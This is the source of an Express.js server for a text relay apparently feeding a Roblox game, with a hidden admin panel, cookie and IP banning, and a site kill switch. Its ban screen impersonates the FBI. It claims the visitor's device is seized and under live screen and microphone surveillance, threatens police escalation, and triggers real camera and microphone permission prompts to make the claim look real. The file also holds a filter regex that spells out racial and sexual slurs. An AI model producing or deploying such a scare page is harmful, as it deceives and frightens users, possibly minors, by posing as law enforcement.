const express = require('express');
const cookieParser = require('cookie-parser'); 
const app = express();
const PORT = process.env.PORT || 10000;

app.set('trust proxy', true);

/**
 * 🕵️ STEALTH & SECURITY CONFIG
 */
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 
const MARCUS_SECRET_KEY = process.env.MARCUS_SECRET_KEY;
// UPDATED COOKIE SECRET
const COOKIE_SECRET = process.env.COOKIE_SECRET; 

const SECRET_PATHS = {
    CONTROL: process.env.PATH_CTRL || "/cx_" + Math.random().toString(36).substring(7),
    TYPE: process.env.PATH_TYPE || "/ty_" + Math.random().toString(36).substring(7),
    BAN: "/api/sys/ban_internal"
};

const SUPER_ADMIN = "MARCUS"; 
const ADMIN_IDENTITIES = ["MARCUS", "MARCUSCABALUNA", "M2", "NATAL", "AISULTAN", "INTENS"];

let IS_SHUTDOWN = false;
let BANNED_COOKIES = []; 
let BANNED_IPS = []; 

// Updated Auto-ban regex for hateful content including EFN/ERN variations
const forbiddenRegex = /nigger|nigga|pussy|faggot|kike|slut|EFN|ERN|EPSTEIN/i;

app.use(express.json());
app.use(cookieParser(COOKIE_SECRET));

let state = { 
    currentBinary: "00000000", 
    queue: [], 
    isPulsing: false,
    activeUsers: {} 
};

/**
 * 🛡️ THE SEIZURE BAN SCREEN
 */
const showBanScreen = (res, ip) => {
    return res.status(403).send(`
        <body style="background:#f0f0f0; color:#000; font-family: serif; text-align:center; padding: 50px; margin:0;">
            <div style="max-width: 800px; margin: auto; border: 12px solid #003366; background: #fff; padding: 40px; box-shadow: 0 0 50px rgba(0,0,0,0.5);">
                <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Seal_of_the_Federal_Bureau_of_Investigation.svg" width="180" style="margin-bottom:20px;">
                
                <h1 style="font-size: 36px; color: #003366; margin: 0 0 20px 0; text-transform: uppercase; font-weight: bold;">
                    This device has been seized
                </h1>
                
                <p style="font-size: 20px; line-height: 1.5; color: #333;">
                    Your device has been seized and is now being under control over the FBI and your IP: 
                    <span style="color: red; font-weight: bold; font-family: monospace;">${ip}</span>
                </p>

                <div style="margin: 30px 0; padding: 20px; background: #ffeeee; border: 2px dashed red; text-align: left;">
                    <h3 style="color: red; margin-top:0;">⚠️ LIVE SURVEILLANCE ACTIVE</h3>
                    <p style="font-family: monospace; font-size: 14px; margin: 5px 0;">> INITIALIZING SCREEN_SHARE FEED... <span style="color:green;">[OK]</span></p>
                    <p style="font-family: monospace; font-size: 14px; margin: 5px 0;">> ACCESSING MICROPHONE ARRAY... <span style="color:green;">[OK]</span></p>
                    <p style="font-family: monospace; font-size: 14px; margin: 5px 0;">> UPLOADING LOCAL STORAGE METADATA... <span style="color:green;">[ACTIVE]</span></p>
                    <div style="width: 100%; height: 10px; background: #ddd; margin-top: 10px;">
                        <div style="width: 82%; height: 100%; background: red;"></div>
                    </div>
                </div>

                <p style="font-size: 14px; color: #777;">
                    Any attempt to refresh or bypass this screen will result in immediate escalation to your local ISP and Law Enforcement Agency.
                </p>
            </div>
            
            <script>
                // Triggers browser prompts to make the surveillance look real
                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
                
                // Anti-tamper: Block context menu
                document.addEventListener('contextmenu', event => event.preventDefault());
            </script>
        </body>
    `);
};

/**
 * 🛡️ SECURITY MIDDLEWARE
 */
app.use((req, res, next) => {
    const userCookie = req.signedCookies.user_cookie; 
    const ip = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (userCookie) {
        state.activeUsers[userCookie] = { id: userCookie, ip: ip, lastSeen: new Date().toLocaleTimeString() };
    }

    if (BANNED_IPS.includes(ip) || (userCookie && BANNED_COOKIES.includes(userCookie))) {
        return showBanScreen(res, ip);
    }

    const publicPaths = ["/typewriter/read", "/typewriter/edit", "/typewriter/login"];
    const isSecretPath = Object.values(SECRET_PATHS).includes(req.path);
    
    if (!publicPaths.includes(req.path) && !isSecretPath && !req.path.includes('.')) {
        return res.status(404).send("Not Found");
    }

    if (IS_SHUTDOWN && userCookie !== SUPER_ADMIN && req.path !== "/typewriter/read") {
        return showBanScreen(res, ip);
    }
    next();
});

app.get('/typewriter/read', (req, res) => {
    if (state.queue.length === 0 && !state.isPulsing) state.currentBinary = "00000000";
    if (state.queue.length > 0 && !state.isPulsing) {
        const char = state.queue.shift();
        state.isPulsing = true;
        state.currentBinary = char.charCodeAt(0).toString(2).padStart(7, '0') + "1";
        setTimeout(() => { state.currentBinary = "00000000"; state.isPulsing = false; }, 50); 
    }
    res.json({ "value": state.currentBinary, "next": state.currentBinary.endsWith("1") });
});

app.get('/typewriter/login', (req, res) => {
    const { pass } = req.query;
    if (pass === ADMIN_PASSWORD || pass === MARCUS_SECRET_KEY) {
        res.cookie('user_cookie', SUPER_ADMIN, { 
            signed: true, 
            httpOnly: true, 
            maxAge: 31536000000, 
            path: '/',
            sameSite: 'Strict'
        });
        return res.redirect('/typewriter/edit');
    }
    res.status(403).send("BYE");
});

app.get('/typewriter/edit', (req, res) => {
    const userCookie = req.signedCookies.user_cookie || "Unknown";
    if (!ADMIN_IDENTITIES.includes(userCookie)) return res.status(404).send("Not Found");

    const usersStr = Object.values(state.activeUsers).map(u => {
        const isBanned = BANNED_COOKIES.includes(u.id) || BANNED_IPS.includes(u.ip);
        const isAdmin = ADMIN_IDENTITIES.includes(u.id);
        const safeId = String(u.id).replace(/[<>]/g, ''); 
        return `
        <li style="border-bottom: 1px solid #222; padding: 10px 0; font-size: 11px; list-style:none; display:flex; justify-content:space-between; align-items:center;">
            <span style="color:${isBanned ? 'red' : 'white'}"><b>${safeId}</b> <small>(${u.ip})</small></span>
            <div>
                ${(userCookie === SUPER_ADMIN && !isAdmin) ? `
                    <button onclick="ban('${safeId}', '${u.ip}')" style="background:red; color:white; border:none; padding:2px 5px; cursor:pointer;">BAN</button>
                ` : ''}
            </div>
        </li>`;
    }).join('');

    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>FORTRESS_V6</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
        <body style="background:#050505; color:#00ff41; font-family:monospace; padding:15px; margin:0;">
            <div style="border:1px solid #00ff41; padding:15px; max-width:600px; margin:auto;">
                <h2 style="margin:0 0 10px 0;">FORTRESS_SYSTEM</h2>
                <div style="font-size:10px; color:#888; margin-bottom:10px;">ID: ${userCookie}</div>
                
                ${userCookie === SUPER_ADMIN ? `
                    <button onclick="ctrl()" style="background:${IS_SHUTDOWN ? 'green' : 'red'}; color:white; border:none; padding:5px 10px; cursor:pointer; margin-bottom:10px;">
                        ${IS_SHUTDOWN ? 'RESTORE SITE' : 'KILL SITE'}
                    </button>
                ` : ''}

                <textarea id="m" placeholder="Transmit to Roblox..." style="width:100%; height:80px; background:#000; color:#00ff41; border:1px solid #00ff41; padding:10px; box-sizing:border-box;"></textarea>
                <button onclick="s()" style="width:100%; background:#00ff41; color:#000; padding:15px; font-weight:bold; border:none; margin-top:10px; cursor:pointer;">TRANSMIT</button>
                
                <div style="margin-top:20px; border:1px solid #333; padding:10px;">
                    <small style="color:#888;">CONNECTIONS</small>
                    <ul style="padding:0; margin:10px 0 0 0;">${usersStr}</ul>
                </div>
            </div>
            <script>
                async function ctrl(){ await fetch('${SECRET_PATHS.CONTROL}'); location.reload(); }
                async function ban(id, ip){ 
                    await fetch('${SECRET_PATHS.BAN}', { 
                        method:'POST', 
                        headers:{'Content-Type':'application/json'}, 
                        body:JSON.stringify({target:id, ip:ip}) 
                    }); 
                    location.reload(); 
                }
                async function s(){ 
                    const res = await fetch('${SECRET_PATHS.TYPE}', {
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body: JSON.stringify({m: document.getElementById('m').value})
                    });
                    if (res.status === 403) location.reload();
                    document.getElementById('m').value="";
                }
            </script>
        </body>
        </html>
    `);
});

app.get(SECRET_PATHS.CONTROL, (req, res) => {
    if (req.signedCookies.user_cookie === SUPER_ADMIN) { IS_SHUTDOWN = !IS_SHUTDOWN; res.json({ok:true}); }
});

app.post(SECRET_PATHS.TYPE, (req, res) => {
    const user = req.signedCookies.user_cookie;
    if (!ADMIN_IDENTITIES.includes(user)) return res.status(403).send("ERR");
    
    if (forbiddenRegex.test(req.body.m)) {
        BANNED_COOKIES.push(user);
        BANNED_IPS.push(req.ip); 
        return res.status(403).json({error: "AUTO_BAN"});
    }

    state.queue = [...req.body.m.split("")];
    res.json({ok:true});
});

app.post(SECRET_PATHS.BAN, (req, res) => {
    if (req.signedCookies.user_cookie === SUPER_ADMIN) { 
        BANNED_COOKIES.push(req.body.target); 
        if(req.body.ip) BANNED_IPS.push(req.body.ip);
        res.json({ok:true}); 
    }
});

app.listen(PORT, '0.0.0.0');
